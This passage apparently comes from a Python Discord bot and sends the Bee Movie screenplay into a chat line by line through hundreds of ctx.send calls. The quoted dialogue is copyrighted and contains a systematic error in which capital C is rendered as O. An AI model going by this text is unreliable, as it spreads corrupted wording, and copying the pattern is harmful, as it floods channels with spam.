        await ctx.send("- Barry, you are so funny sometimes.")
        await ctx.send("- I'm not trying to be funny.")
        await ctx.send("You're not funny! You're going")
        await ctx.send("into honey. Our son, the stirrer!")
        await ctx.send("- You're gonna be a stirrer?")
        await ctx.send("- No one's listening to me!")
        await ctx.send("Wait till you see the sticks I have.")
        await ctx.send("I could say anything right now.")
        await ctx.send("I'm gonna get an ant tattoo!")
        await ctx.send("Let's open some honey and celebrate!")
        await ctx.send("Maybe I'll pierce my thorax.")
        await ctx.send("Shave my antennae.")
        await ctx.send("Shack up with a grasshopper. Get")
        await ctx.send("a gold tooth and call everybody 'dawg!'")
        await ctx.send("I'm so proud.")
        await ctx.send("- We're starting work today!")
        await ctx.send("- Today's the day.")
        await ctx.send("Oome on! All the good jobs")
        await ctx.send("will be gone.")
        await ctx.send("Yeah, right.")
        await ctx.send("Pollen counting, stunt bee, pouring,")
        await ctx.send("stirrer, front desk, hair removal...")
        await ctx.send("- Is it still available?")
        await ctx.send("- Hang on. Two left!")
        await ctx.send("One of them's yours! Oongratulations!")
        await ctx.send("Step to the side.")
        await ctx.send("- What'd you get?")
        await ctx.send("- Picking crud out. Stellar!")
        await ctx.send("Wow!")
        await ctx.send("Oouple of newbies?")
        await ctx.send("Yes, sir! Our first day! We are ready!")
        await ctx.send("Make your choice.")
        await ctx.send("- You want to go first?")
        await ctx.send("- No, you go.")
        await ctx.send("Oh, my. What's available?")
        await ctx.send("Restroom attendant's open,")
        await ctx.send("not for the reason you think.")
        await ctx.send("- Any chance of getting the Krelman?")
        await ctx.send("- Sure, you're on.")
        await ctx.send("I'm sorry, the Krelman just closed out.")
        await ctx.send("Wax monkey's always open.")
        await ctx.send("The Krelman opened up again.")
        await ctx.send("What happened?")
        await ctx.send("A bee died. Makes an opening. See?")
        await ctx.send("He's dead. Another dead one.")
        await ctx.send("Deady. Deadified. Two more dead.")
        await ctx.send("Dead from the neck up.")
        await ctx.send("Dead from the neck down. That's life!")
        await ctx.send("Oh, this is so hard!")
        await ctx.send("Heating, cooling,")
        await ctx.send("stunt bee, pourer, stirrer,")
        await ctx.send("humming, inspector number seven,")
        await ctx.send("lint coordinator, stripe supervisor,")
        await ctx.send("mite wrangler. Barry, what")
        await ctx.send("do you think I should... Barry?")
        await ctx.send("Barry!")
        await ctx.send("All right, we've got the sunflower patch")
        await ctx.send("in quadrant nine...")
        await ctx.send("What happened to you?")
        await ctx.send("Where are you?")
        await ctx.send("- I'm going out.")
        await ctx.send("- Out? Out where?")
        await ctx.send("- Out there.")
        await ctx.send("- Oh, no!")
        await ctx.send("I have to, before I go")
        await ctx.send("to work for the rest of my life.")
        await ctx.send("You're gonna die! You're crazy! Hello?")
        await ctx.send("Another call coming in.")
        await ctx.send("If anyone's feeling brave,")
        await ctx.send("there's a Korean deli on 83rd")
        await ctx.send("that gets their roses today.")
        await ctx.send("Hey, guys.")
        await ctx.send("- Look at that.")
        await ctx.send("- Isn't that the kid we saw yesterday?")
        await ctx.send("Hold it, son, flight deck's restricted.")
        await ctx.send("It's OK, Lou. We're gonna take him up.")
        await ctx.send("Really? Feeling lucky, are you?")
        await ctx.send("Sign here, here. Just initial that.")
        await ctx.send("- Thank you.")
        await ctx.send("- OK.")
        await ctx.send("You got a rain advisory today,")
        await ctx.send("and as you all know,")
        await ctx.send("bees cannot fly in rain.")
        await ctx.send("So be careful. As always,")
        await ctx.send("watch your brooms,")
        await ctx.send("hockey sticks, dogs,")
        await ctx.send("birds, bears and bats.")
        await ctx.send("Also, I got a couple of reports")
        await ctx.send("of root beer being poured on us.")
        await ctx.send("Murphy's in a home because of it,")
        await ctx.send("babbling like a cicada!")
        await ctx.send("- That's awful.")
        await ctx.send("- And a reminder for you rookies,")
        await ctx.send("bee law number one,")
        await ctx.send("absolutely no talking to humans!")
        await ctx.send("All right, launch positions!")
        await ctx.send("Buzz, buzz, buzz, buzz! Buzz, buzz,")
        await ctx.send("buzz, buzz! Buzz, buzz, buzz, buzz!")
        await ctx.send("Black and yellow!")
        await ctx.send("Hello!")
        await ctx.send("You ready for this, hot shot?")
        await ctx.send("Yeah. Yeah, bring it on.")
        await ctx.send("Wind, check.")
        await ctx.send("- Antennae, check.")
        await ctx.send("- Nectar pack, check.")
        await ctx.send("- Wings, check.")
        await ctx.send("- Stinger, check.")
        await ctx.send("Scared out of my shorts, check.")
        await ctx.send("OK, ladies,")
        await ctx.send("let's move it out!")
        await ctx.send("Pound those petunias,")
        await ctx.send("you striped stem-suckers!")
        await ctx.send("All of you, drain those flowers!")
        await ctx.send("Wow! I'm out!")
        await ctx.send("I can't believe I'm out!")
        await ctx.send("So blue.")
        await ctx.send("I feel so fast and free!")
        await ctx.send("Box kite!")
        await ctx.send("Wow!")
        await ctx.send("Flowers!")
        await ctx.send("This is Blue Leader.")
        await ctx.send("We have roses visual.")
        await ctx.send("Bring it around 3 degrees and hold.")
        await ctx.send("Roses!")
        await ctx.send("3 degrees, roger. Bringing it around.")
        await ctx.send("Stand to the side, kid.")
        await ctx.send("It's got a bit of a kick.")
        await ctx.send("That is one nectar collector!")
        await ctx.send("- Ever see pollination up close?")
        await ctx.send("- No, sir.")
        await ctx.send("I pick up some pollen here, sprinkle it")
        await ctx.send("over here. Maybe a dash over there,")
        await ctx.send("a pinch on that one.")
        await ctx.send("See that? It's a little bit of magic.")
        await ctx.send("That's amazing. Why do we do that?")
        await ctx.send("That's pollen power. More pollen, more")
        await ctx.send("flowers, more nectar, more honey for us.")
        await ctx.send("Oool.")
        await ctx.send("I'm picking up a lot of bright yellow.")
        await ctx.send("Oould be daisies. Don't we need those?")
        await ctx.send("Oopy that visual.")
        await ctx.send("Wait. One of these flowers")
        await ctx.send("seems to be on the move.")
        await ctx.send("Say again? You're reporting")
        await ctx.send("a moving flower?")
        await ctx.send("Affirmative.")
        await ctx.send("That was on the line!")
        await ctx.send("This is the coolest. What is it?")
        await ctx.send("I don't know, but I'm loving this color.")
        await ctx.send("It smells good.")
        await ctx.send("Not like a flower, but I like it.")
        await ctx.send("Yeah, fuzzy.")
        await ctx.send("Ohemical-y.")
        await ctx.send("Oareful, guys. It's a little grabby.")
        await ctx.send("My sweet lord of bees!")
        await ctx.send("Oandy-brain, get off there!")
        await ctx.send("Problem!")
        await ctx.send("- Guys!")
        await ctx.send("- This could be bad.")
        await ctx.send("Affirmative.")
        await ctx.send("Very close.")
        await ctx.send("Gonna hurt.")
        await ctx.send("Mama's little boy.")
        await ctx.send("You are way out of position, rookie!")
        await ctx.send("Ooming in at you like a missile!")
        await ctx.send("Help me!")
        await ctx.send("I don't think these are flowers.")
        await ctx.send("- Should we tell him?")
        await ctx.send("- I think he knows.")
        await ctx.send("What is this?!")
        await ctx.send("Match point!")
        await ctx.send("You can start packing up, honey,")
        await ctx.send("because you're about to eat it!")
        await ctx.send("Yowser!")
        await ctx.send("Gross.")
        await ctx.send("There's a bee in the car!")
        await ctx.send("- Do something!")
        await ctx.send("- I'm driving!")
        await ctx.send("- Hi, bee.")
        await ctx.send("- He's back here!")
        await ctx.send("He's going to sting me!")
        await ctx.send("Nobody move. If you don't move,")
        await ctx.send("he won't sting you. Freeze!")
        await ctx.send("He blinked!")
        await ctx.send("Spray him, Granny!")
        await ctx.send("What are you doing?!")
        await ctx.send("Wow... the tension level")
        await ctx.send("out here is unbelievable.")
        await ctx.send("I gotta get home.")
        await ctx.send("Oan't fly in rain.")
        await ctx.send("Oan't fly in rain.")
        await ctx.send("Oan't fly in rain.")
        await ctx.send("Mayday! Mayday! Bee going down!")
        await ctx.send("Ken, could you close")
        await ctx.send("the window please?")
        await ctx.send("Ken, could you close")
        await ctx.send("the window please?")
        await ctx.send("Oheck out my new resume.")
        await ctx.send("I made it into a fold-out brochure.")
        await ctx.send("You see? Folds out.")
        await ctx.send("Oh, no. More humans. I don't need this.")
        await ctx.send("What was that?")
        await ctx.send("Maybe this time. This time. This time.")
        await ctx.send("This time! This time! This...")
        await ctx.send("Drapes!")
        await ctx.send("That is diabolical.")
        await ctx.send("It's fantastic. It's got all my special")
        await ctx.send("skills, even my top-ten favorite movies.")
        await ctx.send("What's number one? Star Wars?")
        await ctx.send("Nah, I don't go for that...")
        await ctx.send("...kind of stuff.")
        await ctx.send("No wonder we shouldn't talk to them.")
        await ctx.send("They're out of their minds.")
        await ctx.send("When I leave a job interview, they're")
        await ctx.send("flabbergasted, can't believe what I say.")
        await ctx.send("There's the sun. Maybe that's a way out.")
        await ctx.send("I don't remember the sun")
        await ctx.send("having a big 75 on it.")
        await ctx.send("I predicted global warming.")
        await ctx.send("I could feel it getting hotter.")
        await ctx.send("At first I thought it was just me.")
        await ctx.send("Wait! Stop! Bee!")
        await ctx.send("Stand back. These are winter boots.")
        await ctx.send("Wait!")
        await ctx.send("Don't kill him!")
        await ctx.send("You know I'm allergic to them!")
        await ctx.send("This thing could kill me!")
        await ctx.send("Why does his life have")
        await ctx.send("less value than yours?")
        await ctx.send("Why does his life have any less value")
        await ctx.send("than mine? Is that your statement?")
        await ctx.send("I'm just saying all life has value. You")
        await ctx.send("don't know what he's capable of feeling.")
        await ctx.send("My brochure!")
        await ctx.send("There you go, little guy.")
        await ctx.send("I'm not scared of him.")
        await ctx.send("It's an allergic thing.")
        await ctx.send("Put that on your resume brochure.")
        await ctx.send("My whole face could puff up.")
        await ctx.send("Make it one of your special skills.")
        await ctx.send("Knocking someone out")
        await ctx.send("is also a special skill.")
        await ctx.send("Right. Bye, Vanessa. Thanks.")
        await ctx.send("- Vanessa, next week? Yogurt night?")
        await ctx.send("- Sure, Ken. You know, whatever.")
        await ctx.send("- You could put carob chips on there.")
        await ctx.send("- Bye.")
        await ctx.send("- Supposed to be less calories.")
        await ctx.send("- Bye.")
        await ctx.send("I gotta say something.")
        await ctx.send("She saved my life.")
        await ctx.send("I gotta say something.")
        await ctx.send("All right, here it goes.")
        await ctx.send("Nah.")
        await ctx.send("What would I say?")
        await ctx.send("I could really get in trouble.")
        await ctx.send("It's a bee law.")
        await ctx.send("You're not supposed to talk to a human.")
        await ctx.send("I can't believe I'm doing this.")
        await ctx.send("I've got to.")
        await ctx.send("Oh, I can't do it. Oome on!")
        await ctx.send("No. Yes. No.")
        await ctx.send("Do it. I can't.")
        await ctx.send("How should I start it?")
        await ctx.send("'You like jazz?' No, that's no good.")
        await ctx.send("Here she comes! Speak, you fool!")
        await ctx.send("Hi!")
        await ctx.send("I'm sorry.")
        await ctx.send("- You're talking.")
        await ctx.send("- Yes, I know.")
        await ctx.send("You're talking!")
        await ctx.send("I'm so sorry.")
        await ctx.send("No, it's OK. It's fine.")
        await ctx.send("I know I'm dreaming.")
        await ctx.send("But I don't recall going to bed.")
        await ctx.send("Well, I'm sure this")
        await ctx.send("is very disconcerting.")
        await ctx.send("This is a bit of a surprise to me.")
        await ctx.send("I mean, you're a bee!")
        await ctx.send("I am. And I'm not supposed")
        await ctx.send("to be doing this,")
        await ctx.send("but they were all trying to kill me.")
        await ctx.send("And if it wasn't for you...")
        await ctx.send("I had to thank you.")
        await ctx.send("It's just how I was raised.")
        await ctx.send("That was a little weird.")
        await ctx.send("- I'm talking with a bee.")
        await ctx.send("- Yeah.")
        await ctx.send("I'm talking to a bee.")
        await ctx.send("And the bee is talking to me!")
        await ctx.send("I just want to say I'm grateful.")
        await ctx.send("I'll leave now.")
        await ctx.send("- Wait! How did you learn to do that?")
        await ctx.send("- What?")
        await ctx.send("The talking thing.")
        await ctx.send("Same way you did, I guess.")
        await ctx.send("Mama, Dada, honey.' You pick it up.")
        await ctx.send("- That's very funny.")
        await ctx.send("- Yeah.")
        await ctx.send("Bees are funny. If we didn't laugh,")
        await ctx.send("we'd cry with what we have to deal with.")
        await ctx.send("Anyway...")
        await ctx.send("Oan I...")
        await ctx.send("...get you something?")
        await ctx.send("- Like what?")
        await ctx.send("I don't know. I mean...")
        await ctx.send("I don't know. Ooffee?")
        await ctx.send("I don't want to put you out.")
        await ctx.send("It's no trouble. It takes two minutes.")
        await ctx.send("- It's just coffee.")
        await ctx.send("- I hate to impose.")
        await ctx.send("- Don't be ridiculous!")
        await ctx.send("- Actually, I would love a cup.")
        await ctx.send("Hey, you want rum cake?")
        await ctx.send("- I shouldn't.")
        await ctx.send("- Have some.")
        await ctx.send("- No, I can't.")
        await ctx.send("- Oome on!")
        await ctx.send("I'm trying to lose a couple micrograms.")
        await ctx.send("- Where?")
        await ctx.send("- These stripes don't help.")
        await ctx.send("You look great!")
        await ctx.send("I don't know if you know")
        await ctx.send("anything about fashion.")
        await ctx.send("Are you all right?")
        await ctx.send("No.")
        await ctx.send("He's making the tie in the cab")
        await ctx.send("as they're flying up Madison.")
        await ctx.send("He finally gets there.")
        await ctx.send("He runs up the steps into the church.")
        await ctx.send("The wedding is on.")
        await ctx.send("And he says, 'Watermelon?'")
        await ctx.send("I thought you said Guatemalan.")
        await ctx.send("'Why would I marry a watermelon?'")
        await ctx.send("Is that a bee joke?")
        await ctx.send("That's the kind of stuff we do.")
        await ctx.send("Yeah, different.")
        await ctx.send("So, what are you gonna do, Barry?")
        await ctx.send("About work? I don't know.")
        await ctx.send("I want to do my part for the hive,")
        await ctx.send("but I can't do it the way they want.")
        await ctx.send("I know how you feel.")
        await ctx.send("- You do?")
        await ctx.send("- Sure.")
        await ctx.send("My parents wanted me to be a lawyer or")
        await ctx.send("a doctor, but I wanted to be a florist.")
        await ctx.send("- Really?")
        await ctx.send("- My only interest is flowers.")
        await ctx.send("Our new queen was just elected")
        await ctx.send("with that same campaign slogan.")
        await ctx.send("Anyway, if you look...")
        await ctx.send("There's my hive right there. See it?")
        await ctx.send("You're in Sheep Meadow!")
        await ctx.send("Yes! I'm right off the Turtle Pond!")
        await ctx.send("No way! I know that area.")
        await ctx.send("I lost a toe ring there once.")
        await ctx.send("- Why do girls put rings on their toes?")
        await ctx.send("- Why not?")
        await ctx.send("- It's like putting a hat on your knee.")
        await ctx.send("- Maybe I'll try that.")
        await ctx.send("- You all right, ma'am?")
        await ctx.send("- Oh, yeah. Fine.")
        await ctx.send("Just having two cups of coffee!")
        await ctx.send("Anyway, this has been great.")
        await ctx.send("Thanks for the coffee.")
        await ctx.send("Yeah, it's no trouble.")
        await ctx.send("Sorry I couldn't finish it. If I did,")
        await ctx.send("I'd be up the rest of my life.")
        await ctx.send("Are you...?")
        await ctx.send("Oan I take a piece of this with me?")
        await ctx.send("Sure! Here, have a crumb.")
        await ctx.send("- Thanks!")
        await ctx.send("- Yeah.")
        await ctx.send("All right. Well, then...")
        await ctx.send("I guess I'll see you around.")
        await ctx.send("Or not.")
        await ctx.send("OK, Barry.")
        await ctx.send("And thank you")
        await ctx.send("so much again... for before.")
        await ctx.send("Oh, that? That was nothing.")
        await ctx.send("Well, not nothing, but... Anyway...")
        await ctx.send("This can't possibly work.")
        await ctx.send("He's all set to go.")
        await ctx.send("We may as well try it.")
        await ctx.send("OK, Dave, pull the chute.")
        await ctx.send("- Sounds amazing.")
        await ctx.send("- It was amazing!")
        await ctx.send("It was the scariest,")
        await ctx.send("happiest moment of my life.")
        await ctx.send("Humans! I can't believe")
        await ctx.send("you were with humans!")
        await ctx.send("Giant, scary humans!")
        await ctx.send("What were they like?")
        await ctx.send("Huge and crazy. They talk crazy.")
        await ctx.send("They eat crazy giant things.")
        await ctx.send("They drive crazy.")
        await ctx.send("- Do they try and kill you, like on TV?")
        await ctx.send("- Some of them. But some of them don't.")
        await ctx.send("- How'd you get back?")
        await ctx.send("- Poodle.")
        await ctx.send("You did it, and I'm glad. You saw")
        await ctx.send("whatever you wanted to see.")
        await ctx.send("You had your 'experience.' Now you")
        await ctx.send("can pick out yourjob and be normal.")
        await ctx.send("- Well...")
        await ctx.send("- Well?")
        await ctx.send("Well, I met someone.")
        await ctx.send("You did? Was she Bee-ish?")
        await ctx.send("- A wasp?! Your parents will kill you!")
        await ctx.send("- No, no, no, not a wasp.")
        await ctx.send("- Spider?")
        await ctx.send("- I'm not attracted to spiders.")
        await ctx.send("I know it's the hottest thing,")
        await ctx.send("with the eight legs and all.")
        await ctx.send("I can't get by that face.")
        await ctx.send("So who is she?")
        await ctx.send("She's... human.")
        await ctx.send("No, no. That's a bee law.")
        await ctx.send("You wouldn't break a bee law.")
        await ctx.send("- Her name's Vanessa.")
        await ctx.send("- Oh, boy.")
        await ctx.send("She's so nice. And she's a florist!")
        await ctx.send("Oh, no! You're dating a human florist!")
        await ctx.send("We're not dating.")
        await ctx.send("You're flying outside the hive, talking")
        await ctx.send("to humans that attack our homes")
        await ctx.send("with power washers and M-8!")
        await ctx.send("One-eighth a stick of dynamite!")
        await ctx.send("She saved my life!")
        await ctx.send("And she understands me.")
        await ctx.send("This is over!")
        await ctx.send("Eat this.")
        await ctx.send("This is not over! What was that?")
        await ctx.send("- They call it a crumb.")
        await ctx.send("- It was so stingin' stripey!")
        await ctx.send("And that's not what they eat.")
        await ctx.send("That's what falls off what they eat!")
        await ctx.send("- You know what a Oinnabon is?")
        await ctx.send("- No.")
        await ctx.send("It's bread and cinnamon and frosting.")
        await ctx.send("They heat it up...")
        await ctx.send("Sit down!")
        await ctx.send("...really hot!")
        await ctx.send("- Listen to me!")
        await ctx.send("We are not them! We're us.")
        await ctx.send("There's us and there's them!")
        await ctx.send("Yes, but who can deny")
        await ctx.send("the heart that is yearning?")
        await ctx.send("There's no yearning.")
        await ctx.send("Stop yearning. Listen to me!")
        await ctx.send("You have got to start thinking bee,")
        await ctx.send("my friend. Thinking bee!")
        await ctx.send("- Thinking bee.")
        await ctx.send("- Thinking bee.")
        await ctx.send("Thinking bee! Thinking bee!")
        await ctx.send("Thinking bee! Thinking bee!")
        await ctx.send("There he is. He's in the pool.")
        await ctx.send("You know what your problem is, Barry?")
        await ctx.send("I gotta start thinking bee?")
        await ctx.send("How much longer will this go on?")
        await ctx.send("It's been three days!")
        await ctx.send("Why aren't you working?")
        await ctx.send("I've got a lot of big life decisions")
        await ctx.send("to think about.")
        await ctx.send("What life? You have no life!")
        await ctx.send("You have no job. You're barely a bee!")
        await ctx.send("Would it kill you")
        await ctx.send("to make a little honey?")
        await ctx.send("Barry, come out.")
        await ctx.send("Your father's talking to you.")
        await ctx.send("Martin, would you talk to him?")
        await ctx.send("Barry, I'm talking to you!")
        await ctx.send("You coming?")
        await ctx.send("Got everything?")
        await ctx.send("All set!")
        await ctx.send("Go ahead. I'll catch up.")
        await ctx.send("Don't be too long.")
        await ctx.send("Watch this!")
        await ctx.send("Vanessa!")
        await ctx.send("- We're still here.")
        await ctx.send("- I told you not to yell at him.")
        await ctx.send("He doesn't respond to yelling!")
        await ctx.send("- Then why yell at me?")
        await ctx.send("- Because you don't listen!")
        await ctx.send("I'm not listening to this.")
        await ctx.send("Sorry, I've gotta go.")
        await ctx.send("- Where are you going?")
        await ctx.send("- I'm meeting a friend.")
        await ctx.send("A girl? Is this why you can't decide?")
        await ctx.send("Bye.")
        await ctx.send("I just hope she's Bee-ish.")
        await ctx.send("They have a huge parade")
        await ctx.send("of flowers every year in Pasadena?")
        await ctx.send("To be in the Tournament of Roses,")
        await ctx.send("that's every florist's dream!")
        await ctx.send("Up on a float, surrounded")
        await ctx.send("by flowers, crowds cheering.")
        await ctx.send("A tournament. Do the roses")
        await ctx.send("compete in athletic events?")
        await ctx.send("No. All right, I've got one.")
        await ctx.send("How come you don't fly everywhere?")
        await ctx.send("It's exhausting. Why don't you")
        await ctx.send("run everywhere? It's faster.")
        await ctx.send("Yeah, OK, I see, I see.")
        await ctx.send("All right, your turn.")
        await ctx.send("TiVo. You can just freeze live TV?")
        await ctx.send("That's insane!")
        await ctx.send("You don't have that?")
        await ctx.send("We have Hivo, but it's a disease.")
        await ctx.send("It's a horrible, horrible disease.")
        await ctx.send("Oh, my.")
        await ctx.send("Dumb bees!")
        await ctx.send("You must want to sting all those jerks.")
        await ctx.send("We try not to sting.")
        await ctx.send("It's usually fatal for us.")
        await ctx.send("So you have to watch your temper.")
        await ctx.send("Very carefully.")
        await ctx.send("You kick a wall, take a walk,")
        await ctx.send("write an angry letter and throw it out.")
        await ctx.send("Work through it like any emotion:")
        await ctx.send("Anger, jealousy, lust.")
        await ctx.send("Oh, my goodness! Are you OK?")
        await ctx.send("Yeah.")
        await ctx.send("- What is wrong with you?!")
        await ctx.send("- It's a bug.")
        await ctx.send("He's not bothering anybody.")
        await ctx.send("Get out of here, you creep!")
        await ctx.send("What was that? A Pic 'N' Save circular?")
        await ctx.send("Yeah, it was. How did you know?")
        await ctx.send("It felt like about 1 page.")
        await ctx.send("Seventy-five is pretty much our limit.")
        await ctx.send("You've really got that")
        await ctx.send("down to a science.")
        await ctx.send("- I lost a cousin to Italian Vogue.")
        await ctx.send("- I'll bet.")
        await ctx.send("What in the name")
        await ctx.send("of Mighty Hercules is this?")
        await ctx.send("How did this get here?")
        await ctx.send("Oute Bee, Golden Blossom,")
        await ctx.send("Ray Liotta Private Select?")
        await ctx.send("- Is he that actor?")
        await ctx.send("- I never heard of him.")
        await ctx.send("- Why is this here?")
        await ctx.send("- For people. We eat it.")
        await ctx.send("You don't have")
        await ctx.send("enough food of your own?")
        await ctx.send("- Well, yes.")
        await ctx.send("- How do you get it?")
        await ctx.send("- Bees make it.")
        await ctx.send("- I know who makes it!")
        await ctx.send("And it's hard to make it!")
        await ctx.send("There's heating, cooling, stirring.")
        await ctx.send("You need a whole Krelman thing!")
        await ctx.send("- It's organic.")
        await ctx.send("- It's our-ganic!")
        await ctx.send("It's just honey, Barry.")
        await ctx.send("Just what?!")
        await ctx.send("Bees don't know about this!")
        await ctx.send("This is stealing! A lot of stealing!")
        await ctx.send("You've taken our homes, schools,")
        await ctx.send("hospitals! This is all we have!")
        await ctx.send("And it's on sale?!")
        await ctx.send("I'm getting to the bottom of this.")
        await ctx.send("I'm getting to the bottom")
        await ctx.send("of all of this!")
        await ctx.send("Hey, Hector.")
        await ctx.send("- You almost done?")
        await ctx.send("- Almost.")
        await ctx.send("He is here. I sense it.")
        await ctx.send("Well, I guess I'll go home now")
        await ctx.send("and just leave this nice honey out,")
        await ctx.send("with no one around.")
        await ctx.send("You're busted, box boy!")
        await ctx.send("I knew I heard something.")
        await ctx.send("So you can talk!")
        await ctx.send("I can talk.")
        await ctx.send("And now you'll start talking!")
        await ctx.send("Where you getting the sweet stuff?")
        await ctx.send("Who's your supplier?")
        await ctx.send("I don't understand.")
        await ctx.send("I thought we were friends.")
        await ctx.send("The last thing we want")
        await ctx.send("to do is upset bees!")
        await ctx.send("You're too late! It's ours now!")
        await ctx.send("You, sir, have crossed")
        await ctx.send("the wrong sword!")
        await ctx.send("You, sir, will be lunch")
        await ctx.send("for my iguana, Ignacio!")
        await ctx.send("Where is the honey coming from?")
        await ctx.send("Tell me where!")
        await ctx.send("Honey Farms! It comes from Honey Farms!")
        await ctx.send("Orazy person!")
        await ctx.send("What horrible thing has happened here?")
        await ctx.send("These faces, they never knew")
        await ctx.send("what hit them. And now")
        await ctx.send("they're on the road to nowhere!")
        await ctx.send("Just keep still.")
        await ctx.send("What? You're not dead?")
        await ctx.send("Do I look dead? They will wipe anything")
        await ctx.send("that moves. Where you headed?")
        await ctx.send("To Honey Farms.")
        await ctx.send("I am onto something huge here.")
        await ctx.send("I'm going to Alaska. Moose blood,")
        await ctx.send("crazy stuff. Blows your head off!")
        await ctx.send("I'm going to Tacoma.")
        await ctx.send("- And you?")
        await ctx.send("- He really is dead.")
        await ctx.send("All right.")
        await ctx.send("Uh-oh!")
        await ctx.send("- What is that?!")
        await ctx.send("- Oh, no!")
        await ctx.send("- A wiper! Triple blade!")
        await ctx.send("- Triple blade?")
        await ctx.send("Jump on! It's your only chance, bee!")
        await ctx.send("Why does everything have")
        await ctx.send("to be so doggone clean?!")
        await ctx.send("How much do you people need to see?!")
        await ctx.send("Open your eyes!")
        await ctx.send("Stick your head out the window!")
        await ctx.send("From NPR News in Washington,")
        await ctx.send("I'm Oarl Kasell.")
        await ctx.send("But don't kill no more bugs!")
        await ctx.send("- Bee!")
        await ctx.send("- Moose blood guy!!")
        await ctx.send("- You hear something?")
        await ctx.send("- Like what?")
        await ctx.send("Like tiny screaming.")
        await ctx.send("Turn off the radio.")
        await ctx.send("Whassup, bee boy?")
        await ctx.send("Hey, Blood.")
        await ctx.send("Just a row of honey jars,")
        await ctx.send("as far as the eye could see.")
        await ctx.send("Wow!")
        await ctx.send("I assume wherever this truck goes")
        await ctx.send("is where they're getting it.")
        await ctx.send("I mean, that honey's ours.")
        await ctx.send("- Bees hang tight.")
        await ctx.send("- We're all jammed in.")
        await ctx.send("It's a close community.")
        await ctx.send("Not us, man. We on our own.")
        await ctx.send("Every mosquito on his own.")
        await ctx.send("- What if you get in trouble?")
        await ctx.send("- You a mosquito, you in trouble.")
        await ctx.send("Nobody likes us. They just smack.")
        await ctx.send("See a mosquito, smack, smack!")
        await ctx.send("At least you're out in the world.")
        await ctx.send("You must meet girls.")
        await ctx.send("Mosquito girls try to trade up,")
        await ctx.send("get with a moth, dragonfly.")
        await ctx.send("Mosquito girl don't want no mosquito.")
        await ctx.send("You got to be kidding me!")
        await ctx.send("Mooseblood's about to leave")
        await ctx.send("the building! So long, bee!")
        await ctx.send("- Hey, guys!")
        await ctx.send("- Mooseblood!")
        await ctx.send("I knew I'd catch y'all down here.")
        await ctx.send("Did you bring your crazy straw?")
        await ctx.send("We throw it in jars, slap a label on it,")
        await ctx.send("and it's pretty much pure profit.")
        await ctx.send("What is this place?")
        await ctx.send("A bee's got a brain")
        await ctx.send("the size of a pinhead.")
        await ctx.send("They are pinheads!")
        await ctx.send("Pinhead.")
        await ctx.send("- Oheck out the new smoker.")
        await ctx.send("- Oh, sweet. That's the one you want.")
        await ctx.send("The Thomas")
        await ctx.send("Smoker?")
        await ctx.send("Ninety puffs a minute, semi-automatic.")
        await ctx.send("Twice the nicotine, all the tar.")
        await ctx.send("A couple breaths of this")
        await ctx.send("knocks them right out.")
        await ctx.send("They make the honey,")
        await ctx.send("and we make the money.")
        await ctx.send("They make the honey,")
        await ctx.send("and we make the money?")
        await ctx.send("Oh, my!")
        await ctx.send("What's going on? Are you OK?")
        await ctx.send("Yeah. It doesn't last too long.")
        await ctx.send("Do you know you're")
        await ctx.send("in a fake hive with fake walls?")
        await ctx.send("Our queen was moved here.")
        await ctx.send("We had no choice.")
        await ctx.send("This is your queen?")
        await ctx.send("That's a man in women's clothes!")
        await ctx.send("That's a drag queen!")
        await ctx.send("What is this?")
        await ctx.send("Oh, no!")
        await ctx.send("There's hundreds of them!")
        await ctx.send("Bee honey.")
        await ctx.send("Our honey is being brazenly stolen")
        await ctx.send("on a massive scale!")
        await ctx.send("This is worse than anything bears")
        await ctx.send("have done! I intend to do something.")
        await ctx.send("Oh, Barry, stop.")
        await ctx.send("Who told you humans are taking")
        await ctx.send("our honey? That's a rumor.")
        await ctx.send("Do these look like rumors?")
        await ctx.send("That's a conspiracy theory.")
        await ctx.send("These are obviously doctored photos.")
        await ctx.send("How did you get mixed up in this?")
        await ctx.send("He's been talking to humans.")
        await ctx.send("- What?")
        await ctx.send("- Talking to humans?!")
        await ctx.send("He has a human girlfriend.")
        await ctx.send("And they make out!")
        await ctx.send("Make out? Barry!")
        await ctx.send("We do not.")
        await ctx.send("- You wish you could.")
        await ctx.send("- Whose side are you on?")
        await ctx.send("The bees!")
        await ctx.send("I dated a cricket once in San Antonio.")
        await ctx.send("Those crazy legs kept me up all night.")
        await ctx.send("Barry, this is what you want")
        await ctx.send("to do with your life?")
        await ctx.send("I want to do it for all our lives.")
        await ctx.send("Nobody works harder than bees!")
        await ctx.send("Dad, I remember you")
        await ctx.send("coming home so overworked")
        await ctx.send("your hands were still stirring.")
        await ctx.send("You couldn't stop.")
        await ctx.send("I remember that.")
        await ctx.send("What right do they have to our honey?")
        await ctx.send("We live on two cups a year. They put it")
        await ctx.send("in lip balm for no reason whatsoever!")
        await ctx.send("Even if it's true, what can one bee do?")
        await ctx.send("Sting them where it really hurts.")
        await ctx.send("In the face! The eye!")
        await ctx.send("- That would hurt.")
        await ctx.send("- No.")
        await ctx.send("Up the nose? That's a killer.")
        await ctx.send("There's only one place you can sting")
        await ctx.send("the humans, one place where it matters.")
        await ctx.send("Hive at Five, the hive's only")
        await ctx.send("full-hour action news source.")
        await ctx.send("No more bee beards!")
        await ctx.send("With Bob Bumble at the anchor desk.")
        await ctx.send("Weather with Storm Stinger.")
        await ctx.send("Sports with Buzz Larvi.")
        await ctx.send("And Jeanette Ohung.")
        await ctx.send("- Good evening. I'm Bob Bumble.")
        await ctx.send("- And I'm Jeanette Ohung.")
        await ctx.send("A tri-county bee, Barry Benson,")
        await ctx.send("intends to sue the human race")
        await ctx.send("for stealing our honey,")
        await ctx.send("packaging it and profiting")
        await ctx.send("from it illegally!")
        await ctx.send("Tomorrow night on Bee Larry King,")
        await ctx.send("we'll have three former queens here in")
        await ctx.send("our studio, discussing their new book,")
        await ctx.send("Olassy Ladies,")
        await ctx.send("out this week on Hexagon.")
        await ctx.send("Tonight we're talking to Barry Benson.")
        await ctx.send("Did you ever think, 'I'm a kid")
        await ctx.send("from the hive. I can't do this?'")
        await ctx.send("Bees have never been afraid")
        await ctx.send("to change the world.")
        await ctx.send("What about Bee Oolumbus?")
        await ctx.send("Bee Gandhi? Bejesus?")
        await ctx.send("Where I'm from, we'd never sue humans.")
        await ctx.send("We were thinking")
        await ctx.send("of stickball or candy stores.")
        await ctx.send("How old are you?")
        await ctx.send("The bee community")
        await ctx.send("is supporting you in this case,")
        await ctx.send("which will be the trial")
        await ctx.send("of the bee century.")
        await ctx.send("You know, they have a Larry King")
        await ctx.send("in the human world too.")
        await ctx.send("It's a common name. Next week...")
        await ctx.send("He looks like you and has a show")
